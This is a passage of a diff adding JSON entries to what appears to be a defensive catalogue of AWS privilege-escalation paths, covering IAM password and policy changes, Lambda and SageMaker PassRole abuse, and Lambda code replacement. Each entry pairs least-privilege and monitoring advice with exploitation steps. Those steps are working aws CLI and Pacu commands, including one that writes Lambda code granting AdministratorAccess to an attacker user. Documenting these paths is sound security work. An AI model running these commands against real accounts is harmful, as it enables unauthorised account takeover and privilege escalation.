+    }
+  },
+  {
+    "id": "iam-006",
+    "name": "iam:UpdateLoginProfile",
+    "category": "lateral-movement",
+    "services": [
+      "iam"
+    ],
+    "description": "Anyone with access to `iam:UpdateLoginProfile` can change the password of any user they have this permission on. This privilege escalation path requires the user to already have a password set (login profile exists). This permission is often abused by one principal to gain access to another principal and the permissions associated with that principal.",
+    "prerequisites": {
+      "admin": [
+        "Target user must already have a login profile (password)",
+        "Target user must have administrative permissions (e.g., AdministratorAccess)"
+      ],
+      "lateral": [
+        "Target user must already have a login profile (password)"
+      ]
+    },
+    "exploitationSteps": {
+      "awscli": [
+        {
+          "step": 1,
+          "command": "aws iam update-login-profile --user-name @username --password @password",
+          "description": "Change the password for the target user's console login"
+        },
+        {
+          "step": 2,
+          "command": "# Login to AWS Console with the username and new password",
+          "description": "Access AWS Console as the target user"
+        }
+      ]
+    },
+    "recommendation": "Restrict access to `iam:UpdateLoginProfile` using the principle of least privilege. Only allow\nusers to update the password of users they are authorized to manage, most commonly, themselves.\nVery few principals need this permission on all principals, so it should be restricted to only\nthe few principals that need it. Monitor use of this sensitive permission using CloudSIEM\ndetections, and look for usage anomalies.\n",
+    "discoveredBy": {
+      "name": "Spencer Gietzen",
+      "organization": "Rhino Security Labs",
+      "date": "2019"
+    },
+    "references": [
+      {
+        "title": "AWS Privilege Escalation Methods and Mitigation",
+        "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
+      }
+    ],
+    "relatedPaths": [
+      "iam-002",
+      "iam-004"
+    ],
+    "toolSupport": {
+      "pmapper": true,
+      "iamVulnerable": true
+    },
+    "permissions": {
+      "required": [
+        {
+          "permission": "iam:UpdateLoginProfile",
+          "resourceConstraints": "Target IAM user must be in the Resource section"
+        }
+      ],
+      "additional": [
+        {
+          "permission": "iam:ListUsers",
+          "resourceConstraints": "Helpful for discovering target users"
+        },
+        {
+          "permission": "iam:GetUser",
+          "resourceConstraints": "Useful for viewing user details"
+        }
+      ]
+    }
+  },
+  {
+    "id": "iam-007",
+    "name": "iam:PutUserPolicy",
+    "category": "self-escalation",
+    "services": [
+      "iam"
+    ],
+    "description": "Anyone with access to `iam:PutUserPolicy` can attach inline policies to any user they have this permission on. This permission is frequently exploited by a principal to grant themselves additional privileges. A principal can also leverage this to escalate the permissions of another principal they can access.",
+    "prerequisites": [
+      "Principal must be a user (not a role)"
+    ],
+    "exploitationSteps": {
+      "awscli": [
+        {
+          "step": 1,
+          "command": "aws iam put-user-policy --user-name @username --policy-name @policyname --policy-document file://escalation_policy.json",
+          "description": "Attach an inline policy with elevated permissions to the target user"
+        },
+        {
+          "step": 2,
+          "command": "aws sts get-caller-identity",
+          "description": "Verify the new permissions are active (for self-escalation)"
+        }
+      ]
+    },
+    "recommendation": "Restrict access to `iam:PutUserPolicy` using the principle of least privilege. Very few\nprincipals need this permission, so it should be restricted to only the few principals\nthat need it. Monitor use of this sensitive permission using CloudSIEM detections,\nand look for usage anomalies.\n",
+    "discoveredBy": {
+      "name": "Spencer Gietzen",
+      "organization": "Rhino Security Labs",
+      "date": "2019"
+    },
+    "references": [
+      {
+        "title": "AWS Privilege Escalation Methods and Mitigation",
+        "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
+      }
+    ],
+    "relatedPaths": [
+      "iam-001",
+      "iam-005",
+      "iam-008",
+      "iam-010"
+    ],
+    "detectionRules": [
+      {
+        "platform": "CloudSIEM",
+        "url": "https://docs.datadoghq.com/security/default_rules/7b6-2a8-df9/"
+      }
+    ],
+    "toolSupport": {
+      "pmapper": true,
+      "iamVulnerable": true
+    },
+    "permissions": {
+      "required": [
+        {
+          "permission": "iam:PutUserPolicy",
+          "resourceConstraints": "Target user must be in the Resource section. For self-escalation, must have permission on own user."
+        }
+      ]
+    }
+  },
+  {
+    "id": "iam-008",
+    "name": "iam:AttachUserPolicy",
+    "category": "self-escalation",
+    "services": [
+      "iam"
+    ],
+    "description": "Anyone with access to `iam:AttachUserPolicy` can attach managed policies to any user they have this permission on. This permission is frequently exploited by a principal to grant themselves additional privileges. A principal can also leverage this to escalate the permissions of another principal they can access.",
+    "prerequisites": [
+      "A managed IAM policy with elevated privileges must exist in the account",
+      "Principal must be a user (not a role)"
+    ],
+    "exploitationSteps": {
+      "awscli": [
+        {
+          "step": 1,
+          "command": "aws iam attach-user-policy --user-name @username --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
+          "description": "Attach the AdministratorAccess managed policy to the target user"
+        },
+        {
+          "step": 2,
+          "command": "aws sts get-caller-identity",
+          "description": "Verify the new permissions are active (for self-escalation)"
+        }
+      ]
+    },
+    "recommendation": "Restrict access to `iam:AttachUserPolicy` using the principle of least privilege. Very few\nprincipals need this permission, so it should be restricted to only the few principals\nthat need it. Monitor use of this sensitive permission using CloudSIEM detections,\nand look for usage anomalies.\n",
+    "discoveredBy": {
+      "name": "Spencer Gietzen",
+      "organization": "Rhino Security Labs",
+      "date": "2019"
+    },
+    "references": [
+      {
+        "title": "AWS Privilege Escalation Methods and Mitigation",
+        "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
+      }
+    ],
+    "relatedPaths": [
+      "iam-001",
+      "iam-007",
+      "iam-009",
+      "iam-010"
+    ],
+    "detectionRules": [
+      {
+        "platform": "CloudSIEM",
+        "url": "https://docs.datadoghq.com/security/default_rules/7b6-2a8-df9/"
+      }
+    ],
+    "toolSupport": {
+      "pmapper": true,
+      "iamVulnerable": true
+    },
+    "permissions": {
+      "required": [
+        {
+          "permission": "iam:AttachUserPolicy",
+          "resourceConstraints": "Target user must be in the Resource section. For self-escalation, must have permission on own user."
+        }
+      ]
+    }
+  },
+  {
+    "id": "iam-009",
+    "name": "iam:AttachRolePolicy",
+    "category": "self-escalation",
+    "services": [
+      "iam"
+    ],
+    "description": "Anyone with access to `iam:AttachRolePolicy` can attach managed policies to any role they have this permission on. This permission is frequently exploited by a principal to grant themselves additional privileges. A principal can also leverage this to escalate the permissions of another principal they can access.",
+    "prerequisites": [
+      "A managed IAM policy with elevated privileges must exist in the account",
+      "Principal must be a role (not a user)"
+    ],
+    "exploitationSteps": {
+      "awscli": [
+        {
+          "step": 1,
+          "command": "aws iam attach-role-policy --role-name @rolename --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
+          "description": "Attach the AdministratorAccess managed policy to the target role"
+        },
+        {
+          "step": 2,
+          "command": "aws sts get-caller-identity",
+          "description": "Verify the new permissions are active (for self-escalation)"
+        }
+      ]
+    },
+    "recommendation": "Restrict access to `iam:AttachRolePolicy` using the principle of least privilege. Very few\nprincipals need this permission, so it should be restricted to only the few principals\nthat need it. Monitor use of this sensitive permission using CloudSIEM detections,\nand look for usage anomalies.\n",
+    "discoveredBy": {
+      "name": "Spencer Gietzen",
+      "organization": "Rhino Security Labs",
+      "date": "2019"
+    },
+    "references": [
+      {
+        "title": "AWS Privilege Escalation Methods and Mitigation",
+        "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
+      }
+    ],
+    "relatedPaths": [
+      "iam-005",
+      "iam-008",
+      "iam-011"
+    ],
+    "detectionRules": [
+      {
+        "platform": "CloudSIEM",
+        "url": "https://docs.datadoghq.com/security/default_rules/7b6-2a8-df9/"
+      }
+    ],
+    "toolSupport": {
+      "pmapper": true,
+      "iamVulnerable": true
+    },
+    "permissions": {
+      "required": [
+        {
+          "permission": "iam:AttachRolePolicy",
+          "resourceConstraints": "Target role must be in the Resource section. For self-escalation, must have permission on own role."
+        }
+      ]
+    }
+  },
+  {
+    "id": "iam-010",
+    "name": "iam:AttachGroupPolicy",
+    "category": "self-escalation",
+    "services": [
+      "iam"
+    ],
+    "description": "Anyone with access to `iam:AttachGroupPolicy` can attach managed policies to any group they have this permission on. This permission is frequently exploited by a principal to grant themselves additional privileges by attaching policies to a group they are a member of. A principal can also leverage this to escalate the permissions of other principals in the same group.",
+    "prerequisites": [
+      "Principal must be a user (not a role)",
+      "Principal must be a member of the target group",
+      "A managed IAM policy with elevated privileges must exist in the account"
+    ],
+    "exploitationSteps": {
+      "awscli": [
+        {
+          "step": 1,
+          "command": "aws iam attach-group-policy --group-name @groupname --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
+          "description": "Attach the AdministratorAccess managed policy to the group"
+        },
+        {
+          "step": 2,
+          "command": "aws sts get-caller-identity",
+          "description": "Verify the new permissions are active"
+        }
+      ]
+    },
+    "recommendation": "Restrict access to `iam:AttachGroupPolicy` using the principle of least privilege. Very few\nprincipals need this permission, so it should be restricted to only the few principals\nthat need it. Monitor use of this sensitive permission using CloudSIEM detections,\nand look for usage anomalies.\n",
+    "discoveredBy": {
+      "name": "Spencer Gietzen",
+      "organization": "Rhino Security Labs",
+      "date": "2019"
+    },
+    "references": [
+      {
+        "title": "AWS Privilege Escalation Methods and Mitigation",
+        "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
+      }
+    ],
+    "relatedPaths": [
+      "iam-008",
+      "iam-011"
+    ],
+    "detectionRules": [
+      {
+        "platform": "CloudSIEM",
+        "url": "https://docs.datadoghq.com/security/default_rules/7b6-2a8-df9/"
+      }
+    ],
+    "toolSupport": {
+      "pmapper": true,
+      "iamVulnerable": true
+    },
+    "permissions": {
+      "required": [
+        {
+          "permission": "iam:AttachGroupPolicy",
+          "resourceConstraints": "Target group must be in the Resource section. For self-escalation, must have permission on a group the principal belongs to."
+        }
+      ]
+    }
+  },
+  {
+    "id": "iam-011",
+    "name": "iam:PutGroupPolicy",
+    "category": "self-escalation",
+    "services": [
+      "iam"
+    ],
+    "description": "Anyone with access to `iam:PutGroupPolicy` can attach inline policies to any group they have this permission on. This permission is often abused by one principal to grant additional permissions to themselves by attaching an inline policy to a group they are a member of.",
+    "prerequisites": [
+      "Principal must be a user (not a role)",
+      "Principal must be a member of the target group"
+    ],
+    "exploitationSteps": {
+      "awscli": [
+        {
+          "step": 1,
+          "command": "aws iam put-group-policy --group-name @groupname --policy-name @policyname --policy-document file://escalation_policy.json",
+          "description": "Attach an inline policy with elevated permissions to the group"
+        },
+        {
+          "step": 2,
+          "command": "aws sts get-caller-identity",
+          "description": "Verify the new permissions are active"
+        }
+      ]
+    },
+    "recommendation": "Restrict access to `iam:PutGroupPolicy` using the principle of least privilege. Very few\nprincipals need this permission, so it should be restricted to only the few principals\nthat need it. Monitor use of this sensitive permission using CloudSIEM detections,\nand look for usage anomalies.\n",
+    "discoveredBy": {
+      "name": "Spencer Gietzen",
+      "organization": "Rhino Security Labs",
+      "date": "2019"
+    },
+    "references": [
+      {
+        "title": "AWS Privilege Escalation Methods and Mitigation",
+        "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
+      }
+    ],
+    "relatedPaths": [
+      "iam-005",
+      "iam-007",
+      "iam-010"
+    ],
+    "detectionRules": [
+      {
+        "platform": "CloudSIEM",
+        "url": "https://docs.datadoghq.com/security/default_rules/7b6-2a8-df9/"
+      }
+    ],
+    "toolSupport": {
+      "pmapper": true,
+      "iamVulnerable": true
+    },
+    "permissions": {
+      "required": [
+        {
+          "permission": "iam:PutGroupPolicy",
+          "resourceConstraints": "Target group must be in the Resource section. For self-escalation, must have permission on a group the principal belongs to."
+        }
+      ]
+    }
+  },
+  {
+    "id": "iam-012",
+    "name": "iam:UpdateAssumeRolePolicy",
+    "category": "lateral-movement",
+    "services": [
+      "iam"
+    ],
+    "description": "Anyone with access to `iam:UpdateAssumeRolePolicy` can modify the trust policy of any role they have this permission on. This permission is often abused by one principal to modify a privileged role's trust policy to allow themselves to assume it, thereby gaining access to the privileged role's permissions.",
+    "exploitationSteps": {
+      "awscli": [
+        {
+          "step": 1,
+          "command": "aws iam update-assume-role-policy --role-name @rolename --policy-document file://trust_policy.json",
+          "description": "Update the role's trust policy to allow your principal to assume it"
+        },
+        {
+          "step": 2,
+          "command": "aws sts assume-role --role-arn arn:aws:iam::123456789012:role/@rolename --role-session-name exploit",
+          "description": "Assume the privileged role"
+        },
+        {
+          "step": 3,
+          "command": "# Configure AWS CLI with the temporary credentials from assume-role",
+          "description": "Use the elevated permissions of the assumed role"
+        }
+      ]
+    },
+    "recommendation": "Restrict access to `iam:UpdateAssumeRolePolicy` using the principle of least privilege.\nVery few principals need this permission, so it should be restricted to only the few\nprincipals that need it. Monitor use of this sensitive permission using CloudSIEM\ndetections, and look for usage anomalies.\n",
+    "discoveredBy": {
+      "name": "Spencer Gietzen",
+      "organization": "Rhino Security Labs",
+      "date": "2019"
+    },
+    "references": [
+      {
+        "title": "AWS Privilege Escalation Methods and Mitigation",
+        "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
+      }
+    ],
+    "detectionRules": [
+      {
+        "platform": "CloudSIEM",
+        "url": "https://docs.datadoghq.com/security/default_rules/7b6-2a8-df9/"
+      }
+    ],
+    "toolSupport": {
+      "pmapper": true,
+      "iamVulnerable": true
+    },
+    "permissions": {
+      "required": [
+        {
+          "permission": "iam:UpdateAssumeRolePolicy",
+          "resourceConstraints": "Target role must be in the Resource section"
+        }
+      ],
+      "additional": [
+        {
+          "permission": "iam:ListUsers",
+          "resourceConstraints": "Helpful for discovering target users"
+        },
+        {
+          "permission": "iam:GetUser",
+          "resourceConstraints": "Useful for viewing user details"
+        }
+      ]
+    }
+  },
+  {
+    "id": "iam-013",
+    "name": "iam:AddUserToGroup",
+    "category": "lateral-movement",
+    "services": [
+      "iam"
+    ],
+    "description": "A principal with `iam:AddUserToGroup` can add any user to any group they have this permission on. By adding themselves or another user to a group with elevated permissions, they can gain access to the policies attached to that group. The level of access gained depends on the permissions of the target group.",
+    "prerequisites": {
+      "admin": [
+        "A group must exist with administrative permissions (e.g., AdministratorAccess)"
+      ],
+      "lateral": [
+        "A group must exist with some level of permissions"
+      ]
+    },
+    "exploitationSteps": {
+      "awscli": [
+        {
+          "step": 1,
+          "command": "aws iam add-user-to-group --user-name @username --group-name @privileged-group",
+          "description": "Add the target user (or yourself) to a group with elevated permissions"
+        },
+        {
+          "step": 2,
+          "command": "aws sts get-caller-identity",
+          "description": "Verify the new permissions are active"
+        }
+      ]
+    },
+    "recommendation": "Restrict access to `iam:AddUserToGroup` using the principle of least privilege. Only allow\nusers to add users to groups they are authorized to manage. Very few principals need this\npermission, so it should be restricted to only the few principals that need it.\n\nUse IAM policy conditions to restrict which groups users can be added to:\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"iam:AddUserToGroup\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT_ID:group/SpecificGroup\"\n}\n```\n\nMonitor CloudTrail for unusual AddUserToGroup activity, especially adding users to\nprivileged groups.\n",
+    "discoveredBy": {
+      "name": "Spencer Gietzen",
+      "organization": "Rhino Security Labs",
+      "date": "2019"
+    },
+    "references": [
+      {
+        "title": "AWS Privilege Escalation Methods and Mitigation",
+        "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
+      },
+      {
+        "title": "IAM Vulnerable - AddUserToGroup",
+        "url": "https://github.com/BishopFox/iam-vulnerable"
+      }
+    ],
+    "relatedPaths": [
+      "iam-008",
+      "iam-010"
+    ],
+    "toolSupport": {
+      "pmapper": true,
+      "iamVulnerable": true
+    },
+    "permissions": {
+      "required": [
+        {
+          "permission": "iam:AddUserToGroup",
+          "resourceConstraints": "Target group must be in the Resource section"
+        }
+      ],
+      "additional": [
+        {
+          "permission": "iam:ListUsers",
+          "resourceConstraints": "Helpful for discovering target users"
+        },
+        {
+          "permission": "iam:GetUser",
+          "resourceConstraints": "Useful for viewing user details"
+        }
+      ]
+    }
+  },
+  {
+    "id": "lambda-001",
+    "name": "iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction",
+    "category": "service-passrole",
+    "services": [
+      "iam",
+      "lambda"
+    ],
+    "description": "A principal with `iam:PassRole`, `lambda:CreateFunction`, and `lambda:InvokeFunction` can create a new Lambda function and attach an existing IAM Role to it. When the function is invoked, the code executes with the permissions of the attached role. The level of access gained depends on the permissions of the available roles.",
+    "prerequisites": {
+      "admin": [
+        "A role must exist that trusts lambda.amazonaws.com to assume it",
+        "The role must have administrative permissions (e.g., AdministratorAccess)"
+      ],
+      "lateral": [
+        "A role must exist that trusts lambda.amazonaws.com to assume it"
+      ]
+    },
+    "exploitationSteps": {
+      "awscli": [
+        {
+          "step": 1,
+          "command": "aws lambda create-function --function-name privesc-function --runtime python3.9 --role \"arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE\" --handler index.handler --zip-file fileb://exploit.zip",
+          "description": "Create a Lambda function with the privileged role and malicious code"
+        },
+        {
+          "step": 2,
+          "command": "aws lambda invoke --function-name privesc-function output.txt",
+          "description": "Invoke the function to execute code with elevated privileges"
+        },
+        {
+          "step": 3,
+          "command": "cat output.txt",
+          "description": "View the output containing credentials or results of privileged API calls"
+        }
+      ],
+      "pacu": [
+        {
+          "step": 1,
+          "command": "run lambda__backdoor_new_roles --role PRIVILEGED_ROLE",
+          "description": "Use Pacu to create a backdoored Lambda function with the target role"
+        },
+        {
+          "step": 2,
+          "command": "run lambda__invoke --function-name privesc-function",
+          "description": "Invoke the function to retrieve credentials"
+        }
+      ]
+    },
+    "recommendation": "Restrict the `iam:PassRole` permission using the principle of least privilege.\n\nUse IAM policy conditions to restrict which roles can be passed and to which services:\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"`iam:PassRole`\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT_ID:role/SpecificLambdaRole\",\n  \"Condition\": {\n    \"StringEquals\": {\n      \"`iam:PassedToService`\": \"lambda.amazonaws.com\"\n    }\n  }\n}\n```\n\nAdditionally, restrict Lambda function creation and invocation:\n- Limit `lambda:CreateFunction` to specific function name patterns\n- Require resource-based policies on Lambda functions\n- Monitor CloudTrail for unusual Lambda function creation followed by immediate invocation\n",
+    "discoveredBy": {
+      "name": "Spencer Gietzen",
+      "organization": "Rhino Security Labs",
+      "date": "2019"
+    },
+    "references": [
+      {
+        "title": "AWS Privilege Escalation Methods and Mitigation",
+        "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
+      },
+      {
+        "title": "IAM Vulnerable - PassExistingRoleToNewLambdaThenInvoke",
+        "url": "https://github.com/BishopFox/iam-vulnerable/blob/main/modules/free-resources/privesc-paths/privesc15-PassExistingRoleToNewLambdaThenInvoke.tf"
+      }
+    ],
+    "relatedPaths": [
+      "ec2-001",
+      "cloudformation-001"
+    ],
+    "toolSupport": {
+      "pmapper": true,
+      "iamVulnerable": true
+    },
+    "permissions": {
+      "required": [
+        {
+          "permission": "iam:PassRole",
+          "resourceConstraints": "Target role ARN must be in the Resource section"
+        },
+        {
+          "permission": "lambda:CreateFunction",
+          "resourceConstraints": "Must have permission to create Lambda functions"
+        },
+        {
+          "permission": "lambda:InvokeFunction",
+          "resourceConstraints": "Must have permission to invoke Lambda functions"
+        }
+      ],
+      "additional": [
+        {
+          "permission": "iam:ListRoles",
+          "resourceConstraints": "Helpful for discovering available roles to pass"
+        },
+        {
+          "permission": "iam:GetRole",
+          "resourceConstraints": "Useful for viewing role trust policies and attached permissions"
+        }
+      ]
+    }
+  },
+  {
+    "id": "lambda-002",
+    "name": "iam:PassRole + lambda:CreateFunction + lambda:CreateEventSourceMapping",
+    "category": "service-passrole",
+    "services": [
+      "iam",
+      "lambda"
+    ],
+    "description": "A principal with `iam:PassRole`, `lambda:CreateFunction`, and `lambda:CreateEventSourceMapping` can create a Lambda function with a privileged role and configure it to be automatically triggered by an event source (such as DynamoDB streams, Kinesis, or SQS). This allows the attacker to execute code with elevated privileges without manually invoking the function.",
+    "prerequisites": {
+      "admin": [
+        "A role must exist that trusts lambda.amazonaws.com to assume it",
+        "The role must have administrative permissions (e.g., AdministratorAccess)",
+        "An event source must exist (DynamoDB stream, Kinesis stream, or SQS queue)"
+      ],
+      "lateral": [
+        "A role must exist that trusts lambda.amazonaws.com to assume it",
+        "An event source must exist (DynamoDB stream, Kinesis stream, or SQS queue)"
+      ]
+    },
+    "exploitationSteps": {
+      "awscli": [
+        {
+          "step": 1,
+          "command": "aws lambda create-function --function-name privesc-triggered \\\n  --runtime python3.9 --role arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE \\\n  --handler index.handler --zip-file fileb://exploit.zip\n",
+          "description": "Create a Lambda function with the privileged role"
+        },
+        {
+          "step": 2,
+          "command": "aws lambda create-event-source-mapping --function-name privesc-triggered \\\n  --event-source-arn arn:aws:dynamodb:REGION:ACCOUNT_ID:table/TABLE_NAME/stream/STREAM_ID \\\n  --starting-position LATEST\n",
+          "description": "Configure the function to be triggered automatically by an event source"
+        },
+        {
+          "step": 3,
+          "command": "aws dynamodb put-item --table-name TABLE_NAME --item '{\"id\":{\"S\":\"trigger\"}}'",
+          "description": "Trigger the function by adding an item to the DynamoDB table"
+        }
+      ]
+    },
+    "recommendation": "Restrict the `iam:PassRole` permission using the principle of least privilege.\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"iam:PassRole\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT_ID:role/SpecificLambdaRole\",\n  \"Condition\": {\n    \"StringEquals\": {\n      \"iam:PassedToService\": \"lambda.amazonaws.com\"\n    }\n  }\n}\n```\n\nAdditional controls:\n- Restrict `lambda:CreateEventSourceMapping` permissions\n- Monitor CloudTrail for Lambda function creation with event source mappings\n- Alert on Lambda functions with privileged roles being created\n- Implement resource-based policies on event sources\n",
+    "discoveredBy": {
+      "name": "Spencer Gietzen",
+      "organization": "Rhino Security Labs",
+      "date": "2019"
+    },
+    "references": [
+      {
+        "title": "AWS Privilege Escalation Methods and Mitigation",
+        "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
+      },
+      {
+        "title": "IAM Vulnerable - Lambda PassRole with Trigger",
+        "url": "https://github.com/BishopFox/iam-vulnerable"
+      }
+    ],
+    "relatedPaths": [
+      "lambda-001",
+      "lambda-003"
+    ],
+    "toolSupport": {
+      "pmapper": true,
+      "iamVulnerable": true
+    },
+    "permissions": {
+      "required": [
+        {
+          "permission": "iam:PassRole",
+          "resourceConstraints": "Target role ARN must be in the Resource section"
+        },
+        {
+          "permission": "lambda:CreateFunction",
+          "resourceConstraints": "Must have permission to create Lambda functions"
+        },
+        {
+          "permission": "lambda:CreateEventSourceMapping",
+          "resourceConstraints": "Must have permission to create event source mappings"
+        }
+      ],
+      "additional": [
+        {
+          "permission": "iam:ListRoles",
+          "resourceConstraints": "Helpful for discovering available roles to pass"
+        },
+        {
+          "permission": "iam:GetRole",
+          "resourceConstraints": "Useful for viewing role trust policies and attached permissions"
+        },
+        {
+          "permission": "dynamodb:PutItem",
+          "resourceConstraints": "Depending on what event source you configured, you might need permission to trigger it. We're using dynamodb:PutItem here only as an example. Ideally you will create an event source for something that is already happening so that you don't have to do anything manually."
+        }
+      ]
+    }
+  },
+  {
+    "id": "lambda-003",
+    "name": "lambda:UpdateFunctionCode",
+    "category": "access-resource",
+    "services": [
+      "lambda"
+    ],
+    "description": "A principal with `lambda:UpdateFunctionCode` can modify the code of an existing Lambda function that has a privileged execution role. By replacing the function code with malicious code, the attacker can execute arbitrary commands with the privileges of the function's execution role when the function is invoked. This is particularly effective against functions that are automatically triggered by events or regularly invoked.",
+    "prerequisites": {
+      "admin": [
+        "A Lambda function must exist with an administrative execution role (e.g., AdministratorAccess)",
+        "The function must be invokable either manually or via automatic triggers"
+      ],
+      "lateral": [
+        "A Lambda function must exist with a privileged execution role",
+        "The function must be invokable either manually or via automatic triggers"
+      ]
+    },
+    "exploitationSteps": {
+      "awscli": [
+        {
+          "step": 1,
+          "command": "echo 'import boto3; iam = boto3.client(\"iam\"); iam.attach_user_policy(UserName=\"attacker\", PolicyArn=\"arn:aws:iam::aws:policy/AdministratorAccess\")' > lambda_function.py\n",
+          "description": "Create malicious Lambda function code that escalates privileges"
+        },
+        {
+          "step": 2,
+          "command": "zip exploit.zip lambda_function.py",
+          "description": "Package the malicious code into a deployment package"
+        },
+        {
+          "step": 3,
+          "command": "aws lambda update-function-code --function-name TARGET_FUNCTION \\\n  --zip-file fileb://exploit.zip\n",
+          "description": "Update the target Lambda function with the malicious code"
+        },
+        {
+          "step": 4,
+          "command": "aws lambda invoke --function-name TARGET_FUNCTION output.txt",
+          "description": "Invoke the function to execute the privilege escalation"
+        }
+      ]
+    },
+    "recommendation": "Restrict the `lambda:UpdateFunctionCode` permission using the principle of least privilege.\nUse resource-based policies to limit which functions can be modified:\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"lambda:UpdateFunctionCode\",\n  \"Resource\": \"arn:aws:lambda:REGION:ACCOUNT_ID:function/SpecificFunction\"\n}\n```\n\nAdditional controls:\n- Monitor CloudTrail for `UpdateFunctionCode` events on sensitive functions\n- Implement Lambda function versioning and aliases to prevent direct modification\n- Use AWS Config rules to detect changes to Lambda function code\n- Require code signing for Lambda deployments\n- Alert on Lambda functions with privileged roles being modified\n",
+    "discoveredBy": {
+      "name": "Spencer Gietzen",
+      "organization": "Rhino Security Labs",
+      "date": "2019"
+    },
+    "references": [
+      {
+        "title": "AWS Privilege Escalation Methods and Mitigation",
+        "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
+      },
+      {
+        "title": "IAM Vulnerable - Lambda Update Function Code",
+        "url": "https://github.com/BishopFox/iam-vulnerable"
+      }
+    ],
+    "relatedPaths": [
+      "lambda-001",
+      "lambda-002"
+    ],
+    "toolSupport": {
+      "pmapper": true,
+      "iamVulnerable": true
+    },
+    "permissions": {
+      "required": [
+        {
+          "permission": "lambda:UpdateFunctionCode",
+          "resourceConstraints": "Must have permission to update the target Lambda function's code"
+        }
+      ]
+    }
+  },
+  {
+    "id": "sagemaker-001",
+    "name": "iam:PassRole + sagemaker:CreateNotebookInstance",
+    "category": "service-passrole",
+    "services": [
+      "iam",
+      "sagemaker"
+    ],
+    "description": "A principal with `iam:PassRole` and `sagemaker:CreateNotebookInstance` can create a SageMaker notebook instance with a privileged execution role. SageMaker notebooks run Jupyter environments that provide shell access and can execute arbitrary code with the permissions of the attached IAM role. The attacker can then access the notebook and run commands with elevated privileges.",
+    "prerequisites": {
+      "admin": [
+        "A role must exist that trusts sagemaker.amazonaws.com to assume it",
+        "The role must have administrative permissions (e.g., AdministratorAccess)"
+      ],
+      "lateral": [
+        "A role must exist that trusts sagemaker.amazonaws.com to assume it"
+      ]
+    },
+    "exploitationSteps": {
+      "awscli": [
+        {
+          "step": 1,
+          "command": "aws sagemaker create-notebook-instance \\\n  --notebook-instance-name privesc-notebook \\\n  --instance-type ml.t2.medium \\\n  --role-arn arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE\n",
+          "description": "Create a SageMaker notebook instance with the privileged role"
+        },
+        {
+          "step": 2,
+          "command": "aws sagemaker describe-notebook-instance --notebook-instance-name privesc-notebook",
+          "description": "Wait for the notebook instance to be in 'InService' status"
+        },
+        {
+          "step": 3,
+          "command": "aws sagemaker create-presigned-notebook-instance-url --notebook-instance-name privesc-notebook",
+          "description": "Generate a presigned URL to access the notebook"
+        },
+        {
+          "step": 4,
+          "command": "Open the presigned URL in a browser and use the Jupyter terminal to execute privileged commands",
+          "description": "Access the notebook and execute commands with the privileged role's permissions"
+        }
+      ]
+    },
+    "recommendation": "Restrict the `iam:PassRole` permission using the principle of least privilege.\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"iam:PassRole\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT_ID:role/SpecificSageMakerRole\",\n  \"Condition\": {\n    \"StringEquals\": {\n      \"iam:PassedToService\": \"sagemaker.amazonaws.com\"\n    }\n  }\n}\n```\n\nAdditional controls:\n- Restrict `sagemaker:CreateNotebookInstance` permissions\n- Monitor CloudTrail for SageMaker notebook creation with privileged roles\n- Use VPC configuration to isolate notebook instances\n- Implement lifecycle configurations to restrict notebook capabilities\n- Alert on notebook instances with administrative roles being created\n",
+    "discoveredBy": {
+      "name": "Spencer Gietzen",
+      "organization": "Rhino Security Labs",
+      "date": "2019"
+    },
+    "references": [
+      {
+        "title": "AWS Privilege Escalation Methods and Mitigation",
+        "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
+      },
+      {
+        "title": "IAM Vulnerable - SageMaker PassRole",
+        "url": "https://github.com/BishopFox/iam-vulnerable"
+      }
+    ],
+    "relatedPaths": [
+      "sagemaker-002",
+      "sagemaker-003",
+      "sagemaker-004"
+    ],
+    "toolSupport": {
+      "pmapper": true,
+      "iamVulnerable": true
+    },
+    "permissions": {
+      "required": [
+        {
+          "permission": "iam:PassRole",
+          "resourceConstraints": "Target role ARN must be in the Resource section"
+        },
+        {
+          "permission": "sagemaker:CreateNotebookInstance",
+          "resourceConstraints": "Must have permission to create SageMaker notebook instances"
+        }
+      ],
+      "additional": [
+        {
+          "permission": "iam:ListRoles",
+          "resourceConstraints": "Helpful for discovering available roles to pass"
+        },
+        {
+          "permission": "iam:GetRole",
+          "resourceConstraints": "Useful for viewing role trust policies and attached permissions"
+        }
+      ]
+    }
+  },
+  {
+    "id": "sagemaker-002",
+    "name": "iam:PassRole + sagemaker:CreateTrainingJob",
+    "category": "service-passrole",
+    "services": [
+      "iam",
+      "sagemaker"
+    ],
+    "description": "A principal with `iam:PassRole` and `sagemaker:CreateTrainingJob` can create a SageMaker training job with a privileged execution role. Training jobs can execute arbitrary container code and access AWS APIs with the permissions of the attached IAM role. By creating a training job with a malicious training script or container, the attacker can execute code with elevated privileges and exfiltrate credentials or modify AWS resources.",
+    "prerequisites": {
